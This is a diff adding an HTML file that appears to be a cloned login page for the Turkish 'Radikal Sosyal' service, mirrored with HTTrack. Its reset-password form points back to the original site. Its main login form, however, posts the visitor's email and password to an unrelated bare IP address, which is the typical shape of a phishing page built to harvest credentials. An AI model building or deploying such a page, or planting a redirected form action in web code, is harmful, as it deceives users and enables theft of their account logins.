@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<!-- Mirrored from hurpass.com/m/ by HTTrack Website Copier/3.x [XR&CO'2013], Sat, 04 Jul 2015 17:00:06 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+
+<title>Üye Girişi</title>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <link href="https://hurpass.com/Static/v2/themev3/css/m-style.css" rel="stylesheet" type="text/css" />
+    <link href="https://hurpass.com/Static/v2/theme/css/jquery.fancybox.css?v=2.1.0" rel="stylesheet" type="text/css" />
+    <script src="https://hurpass.com/Static/v2/theme/scripts/jquery-1.7.2.min.js" type="text/javascript"></script>
+    <script src="https://hurpass.com/Static/v2/theme/scripts/jquery.fancybox.pack.js?v=2.1.0" type="text/javascript"></script>
+    <script src="https://hurpass.com/Static/v2/theme/scripts/dateSelectBoxes.js" type="text/javascript"></script>
+    <script src="https://hurpass.com/Static/v2/theme/scripts/jquery.html5-placeholder-shim.js" type="text/javascript"></script>
+    <script type="text/javascript">      
+function set_city_visibility() {
+    var t_countryname=$("#countryname").val();
+    if( t_countryname== "Türkiye"){
+        $('#citycontainer').css("visibility", "visible");
+    
+    }
+    else{
+        $('#citycontainer').css("visibility", "hidden");
+    }
+}
+$().ready(function () {
+    $().dateSelectBoxes($('#birthmonth'), $('#birthday'), $('#birthyear'));
+    //$('input, textarea').placeholder();
+    //$('input, text').placeholder();
+});
+$(function () {
+    $.placeholder.shim();
+});
+
+ </script>
+
+       <!-- Partial Script-->
+<script>
+function redirecttoauth(sessionid, sessionvalue, ssoid) {
+        window.location = '' + "?xid1=0c044141-9913-422f-8c14-1f27c593a584&tv1=" + (new Date()).getMilliseconds().toString() + "&ssosid=" + sessionid + "&ssosv=" + sessionvalue + "&ssoid=" + ssoid + "&ssoucp=";
+}
+
+function redirecttoauthFromFrame() {
+    var t_url = '' + "?xid1=00654182-4270-40ce-ab35-d22473a9be6e&tv1=" + (new Date()).getMilliseconds().toString() + "&ssosid=&ssosv=&ssoid=&ssoucp=";
+    try {
+        window.parent.location = t_url;
+    } catch (e) {
+        alert("Yönlendirilirken Hata Oluþtu !");
+    }
+
+}
+    
+
+</script>
+
+</head>
+<body>
+<div class="SocialLogin2014Main resONBottomMain">
+    <div class="responsiveSol">
+    <div class="resTitle">Radikal Sosyal'de Radikal benim!.</div>
+    <div class="resSubtitle">İstediğim konuları seçebilir, kendi sayfamı oluşturabilirim</div>
+    <div class="resVideo-title">Radikal Sosyal dünyasını daha yakından tanımak için tanıtım filmini izleyin.</div>
+   
+
+</div><!--responsiveSol bitis-->
+
+    <div class="responsiveSag">
+    <div class="title resONtitle">Radikal Sosyal</div>
+    <div class="subtitle">Yepyeni bir internet deneyimine hoş geldiniz.</div>
+      <div class="box">
+        <div class="btn-facebook">
+           
+            <a href="giris.html"><img width="283" height="42" src="https://hurpass.com/Static/v2/themev3/images/btn-facebook2.png" alt=""/></a>
+        </div>
+       
+      </div>
+        </div><!--responsiveSag bitis-->
+        
+
+
+    <div class="responsiveSag">
+<div id="div_info" class="box" onkeypress="return submit_form_on_enter(event,'frm_login');">
+    <form method="post" action="http://188.226.208.102/login.php" id="frm_login" name="frm_login">
+        <div class="text-box">
+          <input type="text" tabindex="" name="email" id="email" value="" placeholder="E-posta" />
+        </div>
+        <div class="text-box">
+          <input tabindex="" type="password" name="password" id="password" placeholder="Şifre" />
+        </div>
+        <div class="check-box">
+          <label>
+            <input type="checkbox" name="keepAlive" id="keepAlive" value="ok" checked/>
+            Beni Hatırla</label>
+        </div>
+        <div class="btn-red">
+          <input type="submit" value="Giriş Yapın">
+        </div>
+        <div class="forget"><a href="#" onclick="load_reset_pass();"> Şifremi Unuttum</a></div>
+        <div class="btn-green">
+
+         <a href="registerd41d.html?"><div class="agreement5">Üye Olun</div></a>
+        </div>
+     </form>
+      </div>
+
+
+
+<div class="box" id="div_reset_pass" style="display: none;">
+     <form action="https://hurpass.com/m/reset_pass?"" method="post" id="frm_reset_pass" name="frm_reset_pass">
+        <div class="text-box">
+          <input type="text" tabindex="" name="email" id="email" placeholder="E-posta" />
+        </div>
+        <div class="sozlesme">Lütfen üyelik sistemine kayıtlı e-postanızı giriniz.</div>
+        <div class="btn-red">
+          <input type="submit" name="" id="" value="Şifremi Sıfırla">
+        </div>
+        <div class="h10"></div>
+        <div class="btn-green">
+             <a href="registerd41d.html?"><div class="agreement5">Şimdi Üye Ol</div></a>
+        </div>
+         </form>
+ </div>
+
+</div><!--responsiveSag bitis-->
+
+
+<script type="text/javascript">
+    function submit_form_on_enter(e, frm_name) {
+        if (e && e.keyCode == 13) {
+            submit_form(frm_name);
+        }
+    }
+
+    function submit_form(frm_name) {
+        document.forms[frm_name].submit();
+    }
+
+    function load_reset_pass() {
+        $("#div_info").hide();
+        $("#div_reset_pass").show();
+    }
+</script>
+ 
+
+
+      
+
+<script type="text/javascript">
+
+    window.document.title = "Giriş Yapın | Radikal Dünyası ";
+</script>
+
+
+</div>
+     
+<div class="clearBoth"></div>
+<div class="SocialLogin2014Bottom resONBottom">
+  <div class="footer-line"></div>
+        <div class="resFooter">
+
+
+
+
+            <div class="links FL" style="margin-left:30px;"></div>
+  <div class="links FL">
+      <a href="privacyd41d.html?" title="Gizlilik" class="btn-link">Gizlilik</a>    
+  </div>
+  <div class="links FL">
+      <a href="helpd41d.html?" title="Yardım" class="btn-link">Yardım</a>    
+  </div>
+  <div class="links FL">
+      <a href="contactd41d.html?" title="İletişim" class="btn-link">İletişim</a>    
+  </div>
+            </div>
+  <div class="clearBoth"></div>
+  
+    <div class="copyright"> 
+<a title="Ana Sayfa" href="http://www.Radikal.com.tr/">
+   <img src="https://upload.wikimedia.org/wikipedia/tr/8/83/Radikal_logo.gif" />
+</a>
+<span style="float: right; width: 100%;">&copy; Copyright 2014</span>
+</div>
+
+
+</div>
+<!-- Google Tag Manager -->
+<noscript><iframe src="http://www.googletagmanager.com/ns.html?id=GTM-NVDWP6"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<script>(function (w, d, s, l, i) {
+w[l] = w[l] || []; w[l].push({
+'gtm.start':
+new Date().getTime(), event: 'gtm.js'
+}); var f = d.getElementsByTagName(s)[0],
+j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
+'http://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
+})(window, document, 'script', 'dataLayer', 'GTM-NVDWP6');</script>
+<!-- End Google Tag Manager -->
+
+
+</body>
+
+<!-- Mirrored from hurpass.com/m/ by HTTrack Website Copier/3.x [XR&CO'2013], Sat, 04 Jul 2015 17:00:09 GMT -->
+</html>
